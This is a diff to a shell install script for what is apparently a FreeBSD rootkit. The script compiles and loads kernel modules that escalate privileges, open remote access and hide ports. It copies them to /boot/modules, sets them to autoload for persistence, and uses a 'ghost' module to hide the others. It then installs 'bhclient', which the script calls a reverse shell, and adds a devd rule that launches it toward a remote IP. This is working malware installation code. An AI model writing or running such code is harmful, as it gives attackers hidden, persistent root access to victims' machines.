@@ -3,33 +3,50 @@
 uid=$(id -u)
 
 if [ "$uid" -ne 0 ]; then
-  echo "Install script must be executed as root"
+  echo "Error: install script must be executed as root"
   exit 1
 fi
 
-klds="elevate ghost"
+if [ -z "$1" ]; then
+  echo "Usage: $0 <remote-ip>"
+  exit 0
+fi
+
+# Add all KLDs here, it will automatically compile, load and hide them.
+# The Makefile should be named Makefile.module
+# The .ko file should be named module.ko
+# The c file should be named module-kld.c
+# IMPORTANT: put ghost last as it will hides all the other KLDs when loaded
+klds="elevate remote port_hiding ghost"
 
 for kld in ${klds}; do
   # Clean kld
   make -f "Makefile.$kld" clean
 
   # Compile KLD
-  make -f "Makefile.$kld"
+  make -f "Makefile.$kld" REMOTE="$1"
 
   if [ "$?" -ne 0 ]; then
-    echo "Error: failed to compile $kld KLD"
+    echo "Warning: failed to compile $kld KLD"
     continue
   fi
 
-  # Load klds
   if [ -e "./$kld.ko" ]; then
+    # Copy to /boot/modules
+    mkdir -p /boot/modules
+    cp "./$kld.ko" /boot/modules
+
+    # Configure autoloading for persistence
+    sysrc kld_list+="$kld"
+
+    # Load klds
     kldload "./$kld.ko"
     if [ "$?" -ne 0 ]; then
-      echo "Error: failed to load $kld.ko with kldload"
+      echo "Warning: failed to load $kld.ko with kldload"
       continue
     fi
   else
-    echo "Error: could not find $kld.ko"
+    echo "Warning: could not find $kld.ko"
     continue
   fi
 done
@@ -42,11 +59,19 @@ if [ "$?" -ne 0 ]; then
   exit 1
 fi
 
-# Hide KLDs with ghost utility, add other klds here to hide them
-# Pass in module name found via kldstat -v
-if [ -e "./ghost" ]; then
-  ./ghost elevate
-  ./ghost ghost
-else
-  echo "Error: could not find ghost utility, kld will not be hidden"
+# Install bhclient (reverse shell) to /sbin
+install -o root -g wheel -m 755 bhclient /sbin/bhclient
+
+# Add matching rule in /etc/devd.conf to run reverse shell to remote address
+if ! grep -q "DHCLIENT" /etc/devd.conf; then
+  mkdir -p /usr/local/etc/devd
+  cat <<EOF > /usr/local/etc/devd/devd.conf
+notify 100 {
+  match "system" "DHCLIENT";
+  match "subsystem" "WORKER";
+  match "type" "START";
+  action "/sbin/bhclient ${1}";
+};
+EOF
+service devd restart
 fi
